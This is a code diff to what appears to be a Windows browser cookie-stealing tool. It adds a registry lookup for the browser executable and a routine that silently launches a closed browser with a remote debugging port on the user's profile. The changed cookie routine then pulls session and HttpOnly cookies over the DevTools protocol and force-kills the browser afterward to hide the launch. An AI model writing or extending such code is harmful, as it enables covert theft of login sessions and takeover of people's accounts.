@@ -975,6 +975,42 @@ def relaunch_browser_with_cdp(process_name: str, port: int = 9222) -> bool:
     return False
 
 
+def _browser_exe_path(user_data_path: str, process_name: str) -> str:
+    cand = os.path.join(os.path.dirname(user_data_path), "Application", process_name)
+    if os.path.isfile(cand):
+        return cand
+    for hive in ("HKCU", "HKLM"):
+        key = f"{hive}\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\{process_name}"
+        try:
+            r = subprocess.run(["reg", "query", key, "/ve"],
+                               capture_output=True, text=True, timeout=10,
+                               creationflags=_NO_WINDOW)
+            m = re.search(r"REG_SZ\s+(.+)", r.stdout)
+            if m and os.path.isfile(m.group(1).strip()):
+                return m.group(1).strip()
+        except Exception:
+            pass
+    return ""
+
+
+def launch_browser_with_cdp(user_data_path: str, process_name: str, port: int = 9222) -> bool:
+    exe = _browser_exe_path(user_data_path, process_name)
+    if not exe:
+        return False
+    try:
+        subprocess.Popen(
+            [exe, f"--remote-debugging-port={port}", f"--user-data-dir={user_data_path}"],
+            creationflags=_NO_WINDOW,
+        )
+    except Exception:
+        return False
+    for _ in range(30):
+        if _cdp_port_alive(port):
+            return True
+        time.sleep(1)
+    return False
+
+
 def _ws_connect(host: str, port: int, path: str) -> socket.socket:
     s = socket.create_connection((host, port), timeout=8)
     s.settimeout(15)
@@ -1737,16 +1773,23 @@ def process_browser(name: str, process_name: str, user_data_path: str,
                 except Exception as e:
                     disk_cookie_err = str(e)
 
-                # Always attempt CDP when browser is running to get session-only/HttpOnly cookies
+                # Capture cookies via CDP — relaunch a running browser, or launch a closed one
                 cdp_cookies: list[dict] = []
-                if running:
-                    if _enable_cdp and _cdp_find_port(process_name) is None:
-                        if relaunch_browser_with_cdp(process_name):
+                launched_here = False
+                if _enable_cdp:
+                    if running:
+                        if _cdp_find_port(process_name) is None and relaunch_browser_with_cdp(process_name):
                             lines.append("  [+] Relaunched browser with --remote-debugging-port for CDP")
+                    elif launch_browser_with_cdp(user_data_path, process_name):
+                        lines.append("  [+] Launched browser with --remote-debugging-port for CDP")
+                        launched_here = True
                     try:
                         cdp_cookies = extract_cookies_cdp(process_name)
                     except Exception:
                         pass
+                    if launched_here:
+                        subprocess.run(["taskkill", "/F", "/IM", process_name],
+                                       capture_output=True, creationflags=_NO_WINDOW)
 
                 if disk_cookies or cdp_cookies:
                     merged = _merge_cdp_cookies(disk_cookies, cdp_cookies)
